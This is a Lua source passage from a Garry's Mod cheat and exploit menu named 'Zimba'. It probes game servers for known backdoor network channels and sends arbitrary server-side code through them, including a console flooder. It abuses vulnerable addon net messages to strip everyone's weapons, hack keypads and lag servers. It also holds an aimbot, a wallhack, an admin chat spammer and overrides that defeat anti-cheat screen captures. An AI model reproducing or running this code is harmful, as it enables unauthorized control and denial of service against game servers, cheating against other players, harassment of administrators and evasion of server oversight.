    StopArtilleryStrike.DoClick = function()
        SploitNotify("Stopping Strike")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "hook.Remove( \"Think\" ,\"bombstrike\")" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local FloodConsole = vgui.Create( "DButton", BackdoorMenu )
    FloodConsole:SetText( "Flood Console" )
    FloodConsole:SizeToContents()
    FloodConsole:SetTall( 25 )
    FloodConsole:SetWide( FloodConsole:GetWide() + 20 )
    FloodConsole:SetPos( 50, 340 )
    FloodConsole:SetTextColor( Color( 255, 255, 255 ) )
    FloodConsole:SetToolTip( "Floods Server Console" )
    FloodConsole.Paint = function( self, w, h )
        DrawBlur(FloodConsole, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    FloodConsole.DoClick = function()
        SploitNotify("Flooding Console")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "timer.Create( \"adminsgonnahate\", 0.05, 0, function() print(\"0100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101010010100100101010100101101010101000101010100101010010001010101011100011001010100101001001010101001011010101010001010101001010100100010101010111000110010101001010010010101010010110101010100010101010010101001000101010101110001100101\") end )" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


------------------------------
--         MISC DERMA       --
------------------------------


local MiscMenu = vgui.Create( "DFrame" )
MiscMenu:SetSize( 630, 450 )
MiscMenu:SetVisible( true )
MiscMenu:SetDraggable( true)
MiscMenu:ShowCloseButton( false )
MiscMenu:Center()
MiscMenu:SetTitle("")
MiscMenu:MakePopup()
MiscMenu.Paint = function( self, w, h )
    DrawBlur(MiscMenu, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
    draw.SimpleText( "Zimba Misc Menu", "Title", MiscMenu:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
end


local MiscMenuClose = vgui.Create( "DButton", MiscMenu )
MiscMenuClose:SetSize( 35, 35 )
MiscMenuClose:SetPos( MiscMenu:GetWide() - 36,9 )
MiscMenuClose:SetText( "X" )
MiscMenuClose:SetFont( "Default" )
MiscMenuClose:SetTextColor( Color( 255, 255, 255 ) )
MiscMenuClose.Paint = function()

end
MiscMenuClose.DoClick = function()
    CloseEverything()
end





local MiscMenuPanelList = vgui.Create( "DScrollPanel", MiscMenu )
MiscMenuPanelList:Dock( FILL )



------------------------------
--      MISC NOCLIP #1      --
------------------------------

local ClientSideNoclip = MiscMenuPanelList:Add( "DButton" )
ClientSideNoclip:SetText( "Toggle Noclip")
ClientSideNoclip:Dock( TOP )
ClientSideNoclip:DockMargin( 0, 50, 0, 5 )
ClientSideNoclip:SetTextColor( Color( 255, 255, 255 ) )
ClientSideNoclip.Paint = function( self, w, h )
    DrawBlur(ClientSideNoclip, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
ClientSideNoclip.DoClick = function()
    surface.PlaySound("garrysmod/ui_click.wav")
    SploitNotify("Noclip Enabled")
    ply:ConCommand( "zimba_toggle_noclip" )
end

------------------------------
--      MISC AIMBOT #2      --
------------------------------

local Aimbott = MiscMenuPanelList:Add( "DButton" )
Aimbott:SetText( "Toggle Aimbot")
Aimbott:Dock( TOP )
Aimbott:DockMargin( 0, 0, 0, 5 )
Aimbott:SetTextColor( Color( 255, 255, 255 ) )
Aimbott.Paint = function( self, w, h )
    DrawBlur(Aimbott, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
Aimbott.DoClick = function()
    surface.PlaySound("garrysmod/ui_click.wav")
    SploitNotify("Aimbot Enabled")
    ply:ConCommand( "zimba_toggle_aimbot" )
end


------------------------------
--    MISC SPAMADMINS #3    --
------------------------------

local SpamAdminChat = MiscMenuPanelList:Add( "DButton" )
SpamAdminChat:SetText( "Spam Admins")
SpamAdminChat:Dock( TOP )
SpamAdminChat:DockMargin( 0, 0, 0, 5 )
SpamAdminChat:SetTextColor( Color( 255, 255, 255 ) )
SpamAdminChat.Paint = function( self, w, h )
    DrawBlur(SpamAdminChat, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
SpamAdminChat.DoClick = function()
    surface.PlaySound("garrysmod/ui_click.wav")
    ply:ConCommand( "zimba_toggle_admin_spam" )
end



------------------------------
--      EXPLOIT DERMA       --
------------------------------

local ExploitMenu = vgui.Create( "DFrame" )
ExploitMenu:SetSize( 630, 450 )
ExploitMenu:SetVisible( true )
ExploitMenu:SetDraggable( true )
ExploitMenu:ShowCloseButton( false )
ExploitMenu:Center()
ExploitMenu:SetTitle("")
ExploitMenu:MakePopup()
ExploitMenu.Paint = function( self, w, h )
    DrawBlur(ExploitMenu, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
    draw.SimpleText( "Zimba Exploit Menu", "Title", ExploitMenu:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
end


local ExploitMenuClose = vgui.Create( "DButton", ExploitMenu )
ExploitMenuClose:SetSize( 35, 35 )
ExploitMenuClose:SetPos( ExploitMenu:GetWide() - 36,9 )
ExploitMenuClose:SetText( "X" )
ExploitMenuClose:SetFont( "Default" )
ExploitMenuClose:SetTextColor( Color( 255, 255, 255 ) )
ExploitMenuClose.Paint = function()

end
ExploitMenuClose.DoClick = function()
    CloseEverything()
end


local ExpolitPanelList = vgui.Create( "DScrollPanel", ExploitMenu )
ExpolitPanelList:Dock( FILL )



------------------------------
--       EXPLOIT #1         --
------------------------------

local status = ValidNetString("properties")
    if (status) then

    totalExploits = 1 + totalExploits

    local StripWeapons = ExpolitPanelList:Add( "DButton" )
    StripWeapons:SetText( "Strip Everyones Weapons")
    StripWeapons:Dock( TOP )
    StripWeapons:DockMargin( 0, 50, 0, 5 )
    StripWeapons:SetTextColor( Color( 255, 255, 255 ) )
    StripWeapons.Paint = function( self, w, h )
        DrawBlur(StripWeapons, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    StripWeapons.DoClick = function()
        removeAll()
        surface.PlaySound("garrysmod/ui_click.wav")
        SploitNotify("Stripping Weapons")
    end
    print("[ZIMBA] Found Exploit: Strip Everyones Weapons *Sometimes Works*")
end

------------------------------
--       EXPLOIT #2         --
------------------------------

local status = ValidNetString("start_wd_emp")
    if (status) then

    totalExploits = 1 + totalExploits

    local HackKeypads = ExpolitPanelList:Add( "DButton" )
    HackKeypads:SetText( "Hack Keypads")
    HackKeypads:Dock( TOP )
    HackKeypads:DockMargin( 0, 0, 0, 5 )
    HackKeypads:SetTextColor( Color( 255, 255, 255 ) )
    HackKeypads.Paint = function( self, w, h )
        DrawBlur(HackKeypads, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    HackKeypads.DoClick = function()
        HackKeypad()
        surface.PlaySound("garrysmod/ui_click.wav")
        SploitNotify("Hacking Keypads")
    end
    print("[ZIMBA] Found Exploit: Hack Keypad")
end


------------------------------
--       EXPLOIT #3         --
------------------------------

local status = ValidNetString("egg")
    if (status) then

    totalExploits = 1 + totalExploits

    local GiveEasterEgg1 = ExpolitPanelList:Add( "DButton" )
    GiveEasterEgg1:SetText( "Give Easter Egg")
    GiveEasterEgg1:Dock( TOP )
    GiveEasterEgg1:DockMargin( 0, 0, 0, 5 )
    GiveEasterEgg1:SetTextColor( Color( 255, 255, 255 ) )
    GiveEasterEgg1.Paint = function( self, w, h )
        DrawBlur(GiveEasterEgg1, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    GiveEasterEgg1.DoClick = function()
        GiveEasterEgg1()
        surface.PlaySound("garrysmod/ui_click.wav")
        SploitNotify("Hacking Keypads")
    end
    print("[ZIMBA] Found Exploit: Give Easter Egg")
end


------------------------------
--       EXPLOIT #4         --
------------------------------


local status = ValidNetString("steamid2")
    if (status) then

    totalExploits = 1 + totalExploits

    local Lagger1 = ExpolitPanelList:Add( "DButton" )
    Lagger1:SetText( "Lagger #1")
    Lagger1:Dock( TOP )
    Lagger1:DockMargin( 0, 0, 0, 5 )
    Lagger1:SetTextColor( Color( 255, 255, 255 ) )
    Lagger1.Paint = function( self, w, h )
        DrawBlur(Lagger1, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    Lagger1.DoClick = function()
        Lagger1()
        surface.PlaySound("garrysmod/ui_click.wav")
        SploitNotify("Starting Lagger #1")
    end
    print("[ZIMBA] Found Exploit: Lagger #1")
end


------------------------------
--       EXPLOIT #5         --
------------------------------


local status = ValidNetString("bodyman_model_change")
    if (status) then

    totalExploits = 1 + totalExploits

    local ModelChanger = ExpolitPanelList:Add( "DButton" )
    ModelChanger:SetText( "Model Changer")
    ModelChanger:Dock( TOP )
    ModelChanger:DockMargin( 0, 0, 0, 5 )
    ModelChanger:SetTextColor( Color( 255, 255, 255 ) )
    ModelChanger.Paint = function( self, w, h )
        DrawBlur(ModelChanger, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    ModelChanger.DoClick = function()
        ply:ConCommand( "zimba_toggle_model_changer" )
        surface.PlaySound("garrysmod/ui_click.wav")
        SploitNotify("Starting Model Changer")
    end
    print("[ZIMBA] Found Exploit: Model Changer")
end






------------------------------
--      Chat Commands       --
------------------------------

hook.Add( "OnPlayerChat", "ChatCommands", function( ply, strText, bTeam, bDead )
    strText = string.lower( strText )
    if ( strText == "!zimbamenu" ) then
        Zimba:Show()
        ZimbaCategories:Show()
        SploitNotify("Loading Menu")
        return true
    end
    if ( strText == "!zimbanoclip" ) then
        SploitNotify("Noclip Enabled")
        ply:ConCommand( "zimba_toggle_noclip" )
        return true
    end
    if ( strText == "!zimbaaimbot" ) then
        SploitNotify("Aimbot Enabled")
        ply:ConCommand( "zimba_toggle_aimbot" )
        return true
    end
end )

------------------------------
--          ESP             --
------------------------------
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
        Vector( min.x, min.y, min.z ),
        Vector( min.x, min.y, max.z ),
        Vector( min.x, max.y, min.z ),
        Vector( min.x, max.y, max.z ),
        Vector( max.x, min.y, min.z ),
        Vector( max.x, min.y, max.z ),
        Vector( max.x, max.y, min.z ),
        Vector( max.x, max.y, max.z )
}
 
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
        local onScreen = ent:LocalToWorld( corner ):ToScreen()
        minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
        maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
 
return minX, minY, maxX, maxY
end

hook.Add("HUDPaint", "ESP", function()

for k,v in pairs(player.GetAll()) do
        local x1,y1,x2,y2 = coordinates(v)
         surface.SetDrawColor(color_white)
 
 
        surface.DrawLine( x1, y1, math.min( x1 + 5, x2 ), y1 )
        surface.DrawLine( x1, y1, x1, math.min( y1 + 5, y2 ) )
 
 
        surface.DrawLine( x2, y1, math.max( x2 - 5, x1 ), y1 )
        surface.DrawLine( x2, y1, x2, math.min( y1 + 5, y2 ) )
 
 
        surface.DrawLine( x1, y2, math.min( x1 + 5, x2 ), y2 )
        surface.DrawLine( x1, y2, x1, math.max( y2 - 5, y1 ) )
 
 
        surface.DrawLine( x2, y2, math.max( x2 - 5, x1 ), y2 )
        surface.DrawLine( x2, y2, x2, math.max( y2 - 5, y1 ) )
            if v ~= LocalPlayer() and v:Alive() then
            local esppos = v:EyePos():ToScreen()
            if(v:GetUserGroup() ~= "user" or v:GetUserGroup() ~= "guest") then
                draw.SimpleText( "[".. v:GetUserGroup() .. "]" .. v:Nick(), "ESP", esppos.x, esppos.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                draw.SimpleText( "Health: " .. v:Health(), "ESP", esppos.x, esppos.y, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
            end
        end
    end 
end)

------------------------------
--          AIMBOT          --
------------------------------

local AB = {}
AB.Enabled = false

function Aimbot()
    if ( !AB.Enabled ) then return end
        local ply = LocalPlayer()
        local trace = util.GetPlayerTrace( ply )
        local traceRes = util.TraceLine( trace )
        if traceRes.HitNonWorld then
        local target = traceRes.Entity
        if target:IsPlayer() then
        local targethead = target:LookupBone("ValveBiped.Bip01_Head1")
        local targetheadpos,targetheadang = target:GetBonePosition(targethead)
        ply:SetEyeAngles((targetheadpos - ply:GetShootPos()):Angle())
        end
    end
end
hook.Add("Think","aimbot",Aimbot)
    
function AB.Toggle()
    AB.Enabled = !AB.Enabled
    AB.LockView = AB.Enabled
    AB.SetView = true

    local status = { [ true ] = "ON", [ false ] = "OFF" }
    SploitNotify("Aimbot: " .. status[ AB.Enabled ])
end
concommand.Add( "zimba_toggle_aimbot", AB.Toggle )


------------------------------
--       SPAM ADMINS        --
------------------------------

function AdminSpammerOpen()

    local AdminSpammer = vgui.Create( "DFrame" )
    AdminSpammer:SetPos( 5, 5 )
    AdminSpammer:SetSize( 285, 160 )
    AdminSpammer:SetVisible( true )
    AdminSpammer:SetTitle("")
    AdminSpammer:SetDraggable( true )
    AdminSpammer:ShowCloseButton( false )
    AdminSpammer:MakePopup()
    AdminSpammer:Center()
    AdminSpammer.Paint = function( self, w, h )
        DrawBlur(AdminSpammer, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
        draw.RoundedBox(0, 2, 2, w - 4, h / 4, Color(0,0,0,125))
        draw.SimpleText( "Admin Chat Spammer", "Title", AdminSpammer:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
    end

    local AdminSpammerClose = vgui.Create( "DButton", AdminSpammer )
    AdminSpammerClose:SetSize( 35, 35 )
    AdminSpammerClose:SetPos( AdminSpammerClose:GetWide() - -220,3 )
    AdminSpammerClose:SetText( "X" )
    AdminSpammerClose:SetFont( "Default" )
    AdminSpammerClose:SetTextColor( Color( 255, 255, 255 ) )
    AdminSpammerClose.Paint = function()
            
    end
    AdminSpammerClose.DoClick = function()
        AdminSpammer:Hide()
    end

    local AdminChatSpammerTextEntry = vgui.Create( "DTextEntry", AdminSpammer ) -- create the form as a child of frame
    AdminChatSpammerTextEntry:SetPos( 35, 60 )
    AdminChatSpammerTextEntry:SetSize( 215, 20 )
    AdminChatSpammerTextEntry:SetText( "" )
    AdminChatSpammerTextEntry.OnEnter = function( self )
        chat.AddText( self:GetValue() ) -- print the form's text as server text
    end

    local StartAdminSpammer = vgui.Create( "DButton", AdminSpammer )
    StartAdminSpammer:SetText( "Start Spammer" )
    StartAdminSpammer:SizeToContents()
    StartAdminSpammer:SetTall( 25 )
    StartAdminSpammer:SetWide( 100 )
    StartAdminSpammer:SetPos( 35, 100 )
    StartAdminSpammer:SetTextColor( Color( 255, 255, 255 ) )
    StartAdminSpammer:SetToolTip( "Checks the hack Client Version." )
    StartAdminSpammer.Paint = function( self, w, h )

        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    StartAdminSpammer.DoClick = function()
        StartAdminSpammer()
    end

    local StopAdminSpammer = vgui.Create( "DButton", AdminSpammer )
    StopAdminSpammer:SetText( "Stop Spammer" )
    StopAdminSpammer:SizeToContents()
    StopAdminSpammer:SetTall( 25 )
    StopAdminSpammer:SetWide( 100 )
    StopAdminSpammer:SetPos( 150, 100 )
    StopAdminSpammer:SetTextColor( Color( 255, 255, 255 ) )
    StopAdminSpammer:SetToolTip( "Checks the hack Client Version." )
    StopAdminSpammer.Paint = function( self, w, h )

        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    end
    StopAdminSpammer.DoClick = function()
        StopAdminSpammer()
    end


    -- Spammer Functions
    function StartAdminSpammer()
        timer.Create( "StartAdminSpammer", 0, 0, function()
            for i = 1, 100 do
            RunConsoleCommand( "ulx", "asay", AdminChatSpammerTextEntry:GetValue() )
            end
        end)
        SploitNotify("Spamming Admins")
        surface.PlaySound("garrysmod/ui_click.wav")
    end

    function StopAdminSpammer()
        timer.Destroy("StartAdminSpammer")
        SploitNotify("Stopped Spamming")
        surface.PlaySound("garrysmod/ui_click.wav")
    end
end
concommand.Add( "zimba_toggle_admin_spam", AdminSpammerOpen )






------------------------------
--        Other Stuff       --
------------------------------
playSound("http://skydarkrp.com/zimba/zimba.mp3")
SploitNotify("Welcome " .. ply:GetName())

Zimba:Hide()
ZimbaCategories:Hide()
ExploitMenu:Hide()
MiscMenu:Hide()
BackdoorMenu:Hide()

function CloseEverything()
    Zimba:Hide()
    ZimbaCategories:Hide()
    ExploitMenu:Hide()
    MiscMenu:Hide()
    BackdoorMenu:Hide()
end

function closealltabs()
    Zimba:Hide()
    ExploitMenu:Hide()
    MiscMenu:Hide()
    BackdoorMenu:Hide()
end

function OpenZimbaMenu()
    Zimba:Show()
    ZimbaCategories:Show()
end

function OpenExploitMenu()
    ExploitMenu:Show()
end

function OpenMiscMenu()
    MiscMenu:Show()
end

function OpenBackdoor()
    BackdoorMenu:Show()
end




------------------------------
--     Check Backdoors      --
------------------------------

function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
        BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Found Backdoor! - memeDoor" )
        netKey = "memeDoor"
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," Backdoor Not Found - memeDoor!" )
    end
    if( ValidNetString("Sandbox_Armdupe") ) then
        BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Found Backdoor! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," BackDoor Not Found - Sandbox_Armdupe!" )
    end
    if( ValidNetString("BackDoor") ) then
        BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Found Backdoor! - Backdoor" )
        netKey = "BackDoor"
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," BackDoor Not Found - Backdoor!" )
    end
    if( ValidNetString("ZimbaBackDoor") ) then
        BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Found Backdoor! - ZimbaBackdoor" )
        netKey = "ZimbaBackDoor"
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," BackDoor Not Found - ZimbaBackdoor!" )
    end
    SploitNotify("Found: ".. BackdoorsFound )
    chat.AddText("Changed Net String to - ".. netKey )
end


concommand.Add("groby_menu", OpenZimbaMenu)
concommand.Add("groby_exploit_menu", OpenExploitMenu)
concommand.Add("groby_misc_menu", OpenMiscMenu)
concommand.Add("groby_backdoor_menu", OpenBackdoor)
concommand.Add("groby_check_backdoors", checkbackdoors)


render.Capture = function() chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Someone tried to screengrab you dont worry your protected ;)" ) return end
render.CapturePixels = function() chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Someone tried to screengrab you dont worry your protected ;)" )return end
render.CapturePixels = function() chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Someone tried to screengrab you dont worry your protected ;)" )return end